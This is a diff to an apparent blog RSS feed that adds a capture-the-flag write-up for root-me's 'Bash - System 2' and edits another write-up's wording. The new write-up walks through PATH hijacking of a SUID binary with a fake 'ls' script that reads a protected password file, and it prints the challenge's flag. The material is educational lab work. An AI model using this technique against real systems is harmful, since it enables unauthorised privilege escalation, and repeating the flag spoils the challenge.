@@ -12,6 +12,194 @@
     </author>
     
       <item>
+        <title>Bash - System 2 - root-me.org</title>
+        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;Since we just solved Bash - System 1 (you can check it out &lt;a href=&quot;bash-system-1-root-me&quot;&gt;here&lt;/a&gt;), let’s go and solve their second level as well. This challenge is very similar to the last one, but with a twist.&lt;/p&gt;
+
+&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
+
+&lt;p&gt;The ‘Statement’ for this challenge is the following C code:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;     
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;setreuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;geteuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ls -lA /challenge/app-script/ch12/.passwd&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To connect to the room, we can SSH:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2222 app-script-ch12@challenge02.root-me.org&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;with the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch12&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
+
+&lt;p&gt;Let’s start building up some calluses again by developing our approach mindset step-by-step. For this problem, we have already tackled the basic concepts in our previous Capture The Flag (CTF) challenge.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
+
+&lt;p&gt;If you are not familiar with the functions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setreuid&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;, go check it out in my last CTF solution for Bash - System 1, which we discussed them thoroughly &lt;a href=&quot;bash-system-1-root-me#step-1---understanding-basic-concepts&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;
+
+&lt;p&gt;We can see that this challenge is fairly similar to Bash - System 1 challenge. However, we have something new here. In the previous CTF, we saw that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; line was simply a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. In this level, the complexity increases with the addition of a switch to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, as seen in the following line of code:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system(&quot;ls -lA /challenge/app-script/ch12/.passwd&quot;);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Note that we have the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; switch passed as argument to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. Let’s SSH into the machine and take a look around:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 32
+dr-xr-x---  2 app-script-ch12-cracked app-script-ch12         4096 Dec 10  2021 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 25 root                    root                    4096 Sep  5 14:00 ..
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt;  1 root                    root                     640 Dec 10  2021 ._perms
+&lt;span class=&quot;nt&quot;&gt;-rw-r-----&lt;/span&gt;  1 root                    root                      43 Dec 10  2021 .git
+&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch12-cracked app-script-ch12-cracked   14 Dec 10  2021 .passwd
+&lt;span class=&quot;nt&quot;&gt;-rwsr-x---&lt;/span&gt;  1 app-script-ch12-cracked app-script-ch12         7252 Dec 10  2021 ch12
+&lt;span class=&quot;nt&quot;&gt;-r--r-----&lt;/span&gt;  1 app-script-ch12         app-script-ch12          204 Dec 10  2021 ch12.c
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, we need to find a way to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt; file through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary, which is the compiled version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12.c&lt;/code&gt;. The problem is exactly the same as the previous one in Bash - System 1. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; SUID bit is set, meaning the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function, alongside with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;setreuid&lt;/code&gt;, will make sure the script runs the command as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch12-cracked&lt;/code&gt;, granting the right permissions we need to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;We could think of a way to trick the program into thinking it ran the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command, but actully runs the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. However, the switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; will make this unbearable. The thing is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command does not have these two switches used here.&lt;/p&gt;
+
+&lt;p&gt;Well, we already know how to make the program runs a crafted &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command. We just need to find a way to make it ignore the switch. That’s our goal!&lt;/p&gt;
+
+&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
+
+&lt;p&gt;We shall start solving this challenge by doing exactly what we have done in Bash - System 1:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;First, we go to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and make a new directory. Then, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cd&lt;/code&gt; into it:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; /tmp/cecil
+app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/cecil
+app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Now, we export this path to our $PATH variable with the following command:&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/tmp/cecil:&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;
+/tmp/cecil:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/opt/tools/checksec/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This part is already done. The new $PATH variable includes our new path as first, meaning that any script will prioritize it when looking for commands to run. Now it comes the tricky part.&lt;/p&gt;
+
+&lt;p&gt;To make a point, let’s try to solve this (erroneously) with the same approach used in Bash - System 1. We copied the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/cat&lt;/code&gt; binary into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil&lt;/code&gt; with the name of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. After that, we run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary to read the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /bin/cat &lt;span class=&quot;nb&quot;&gt;ls
+&lt;/span&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; -
+/challenge/app-script/ch12
+app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;: invalid option &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;l&apos;&lt;/span&gt;
+Try &lt;span class=&quot;s1&quot;&gt;&apos;ls --help&apos;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;more information.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, this does not work, and the reason is exactly because of the switch &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt;. It would have worked if we did not have these switches.&lt;/p&gt;
+
+&lt;h3 id=&quot;abusing-chmod-command&quot;&gt;Abusing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; command&lt;/h3&gt;
+
+&lt;p&gt;One way I thought to circumvent this is by writing a bash script named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; that contained a command to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.passwd&lt;/code&gt;. But to do so, we need access to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;. We can test this in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp/cecil&lt;/code&gt; directory by creating a bash script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; and making it an executable with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +x test&lt;/code&gt;. For our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;test&lt;/code&gt; script, we wrote it with vim:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;hi mom&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Followed by:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;test
+&lt;/span&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./test
+hi mom
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; to create bash executable scripts. Since we are inside a directory included in the path variable, we could craft an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script with a cat command inside of it:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;and then:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:/tmp/cecil&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
+
+&lt;p&gt;Ok. We have a bash script that mimics the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command disguised as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;. Let’s try it out.&lt;/p&gt;
+
+&lt;h3 id=&quot;attempt-1&quot;&gt;Attempt 1&lt;/h3&gt;
+
+&lt;p&gt;If we try to run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary under these circumstances, this is what happens:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nothing. Why?! Here’s what is happening: the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./ch12&lt;/code&gt; is looking for the binary called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, which in this case is a bash script that runs an empty &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command. But what happens with the rest of the string in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; function, you ask? Well, they are treated as command line arguments to our bash script!&lt;/p&gt;
+
+&lt;p&gt;To test this hypothesis, let’s change our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script to the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;False command: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Arguments: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, when our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command runs, it will print out its path and the arguments passed after it. If our hypothesis is correct, when we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; now, it should print the rest of the string as the arguments:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
+False &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;: /tmp/cecil/ls
+Arguments: &lt;span class=&quot;nt&quot;&gt;-lA&lt;/span&gt; /challenge/app-script/ch12/.passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Amazing! It is in the mistakes that we craft a solution!&lt;/p&gt;
+
+&lt;h3 id=&quot;attempt-2&quot;&gt;Attempt 2&lt;/h3&gt;
+
+&lt;p&gt;Since we got rid of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; flag by making it to be passed as arguments of our fake &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; script, we can change the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; bash script to simply &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat /challenge/app-script/ch12/.passwd&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /challenge/app-script/ch12/.passwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch12&lt;/code&gt; binary again:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch12@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./ch12
+8a95eDS/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;e_T#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we get the flag!&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;In this CTF, we dove into another layer of system complexities and the exploitation of C functions. We began by dissecting the core elements presented by the challenge script, progressing towards identifying potential exploitation avenues.&lt;/p&gt;
+
+&lt;p&gt;The strategy was built around the concept of command substitution, made possible by the writable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and by manipulating the $PATH variable. This allowed us to craft a substitute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command that redirected the execution flow from the intended &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -lA&lt;/code&gt; command to our bash script. By creating a bash script, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command was treated as a executable and the rest of the string as arguments, eliminating the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-lA&lt;/code&gt; switch.&lt;/p&gt;
+
+&lt;p&gt;This was all possible due to the fact we had already tackled a similar problem, and because we tried a failed attempt first. Remember, it is in the failures that we find the solution!&lt;/p&gt;
+
+&lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 05 Dec 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//bash-system-2-root-me</link>
+        <link href="http://localhost:4000/bash-system-2-root-me"/>
+        <guid isPermaLink="true">http://localhost:4000/bash-system-2-root-me</guid>
+      </item>
+    
+      <item>
         <title>Bash - System 1 - root-me.org</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
@@ -81,7 +269,7 @@
 
 &lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;
 
-&lt;p&gt;Now that we understand the basic concepts of this CTF script, we are ready to broaden up our view by relating it to the actual CTF. Let’s ssh into the machine and take a look around using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; command:&lt;/p&gt;
+&lt;p&gt;Now that we understand the basic concepts of this CTF script, we are ready to broaden our view by relating it to the actual CTF. Let’s ssh into the machine and take a look around using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -la&lt;/code&gt; command:&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
 total 36
@@ -180,11 +368,11 @@ app-script-ch11@challenge02:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./c
 
 &lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
 
-&lt;p&gt;In this CTF, we learned a bit more about system misconfigurations and misuse of C functions. We started by understanding the core concepts used by the challenge script, then we tackled the problem by understanding why these were a problem in the CTF context.&lt;/p&gt;
+&lt;p&gt;In this CTF, we learned a bit more about system misconfigurations and misuse of C functions. We started by understanding the core concepts used by the challenge script, then we tackled the problem by understanding how we could exploit it.&lt;/p&gt;
 
-&lt;p&gt;After understanding how the CTF was revolving about, we needed to create an attack vector. In our case, that was possible because we had write permissions in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and access to change the $PATH variable to our own gains. Combining the misconfigurations with a little out-of-the-box thinking, we were able to craft a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command that mimicked the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command - the one we wanted to use.&lt;/p&gt;
+&lt;p&gt;After grasping the nature of the CTF, we needed to create an attack vector. In our case, this was possible because we had write permissions in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory and access to change the $PATH variable to our own gains. By combining these misconfigurations with a little out-of-the-box thinking, we crafted a malicious &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt; command that mimicked the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt; command - the one we wanted to use.&lt;/p&gt;
 
-&lt;p&gt;It is always good practice to understand what is happening before jumping into testing. This kind of approach makes things easier, as well as making the solution clearer most of the times.&lt;/p&gt;
+&lt;p&gt;It’s always good practice to understand what’s happening before jumping into testing. This approach makes things easier and often clarifies the solution.&lt;/p&gt;
 
 &lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
 
